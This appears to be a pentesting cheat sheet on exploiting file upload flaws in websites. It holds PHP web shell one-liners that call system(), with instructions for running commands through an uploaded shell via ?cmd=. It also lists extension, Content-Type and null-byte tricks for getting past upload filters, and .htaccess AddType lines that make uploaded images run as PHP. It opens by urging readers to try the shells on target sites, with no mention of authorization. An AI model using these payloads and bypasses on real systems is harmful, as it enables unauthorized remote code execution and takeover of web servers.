You should always test for file upload vulnerabilities by trying to upload simple php shells in target websites.

<?php system('ls') ?>
<?php system('id') ?>
## Via Common php file extensions:
1. .php
2. .php3
3. .php4
4. .php5
5. .php6
6. .phtml
7. .png.php
8. .jpg.php
9. .jpeg.php


for shell.php above add ?cmd=<command-e.g whoami> in the path where the file is uploaded eg /images/safeImage.php?cmd=whoami

## via Content-Type Header Tricks (For Upload Bypass)
image/jpeg	Upload shell.php but rename it shell.jpg and set this as Content-Type. Some apps only check the Content-Type.
application/x-php	Old trick if server-side allows this — rare now.
application/octet-stream	Generic binary stream. Sometimes used to bypass filters that expect image/*.
text/plain	Might bypass if the app only checks for image MIME types.
multipart/form-data; boundary=xyz	Used to send raw POST data for file upload, manipulating boundaries and headers.
text/html	Sometimes used to trick filters, especially in combo with file extension manipulation.
image/png + fake header	Use a real image header + PHP code.


## Via .htaccess:
filename=".htaccess"    OR    ".htaccess%00.jpg"

  AddType application/x-httpd-php .jpg         ---->This will process any jpg file uploaded as php: Also make sure to set Content-Type: application/x-php when uploding the   jpg

  AddType text/html .jpg                       ---->This will process any jpg file uploaded as html

